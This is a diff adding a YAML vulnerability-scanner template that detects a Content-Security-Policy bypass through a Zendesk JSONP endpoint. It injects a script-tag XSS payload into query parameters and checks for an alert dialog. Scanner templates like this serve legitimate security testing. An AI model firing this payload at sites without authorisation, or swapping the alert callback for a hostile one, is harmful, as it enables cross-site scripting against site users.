@@ -1,0 +1,55 @@
+id: zendesk-thiscanbeanything-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Zendesk ThisCanBeAnything
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,zendesk-thiscanbeanything
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "zendesk.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: zendesk_thiscanbeanything_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://thiscanbeanything.zendesk.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "zendesk_thiscanbeanything_csp_xss == true"
+# digest: 4a0a00473045022100d8c935817b4370ff61c3b86956c5cb4b991401cc203ee56f028cf1acef2217b102205c46a9f73ccb78c024371221fe4ec1793f2e357a3bca04cd6a22257340c4625c:922c64590222798bb761d5b6d8e72950
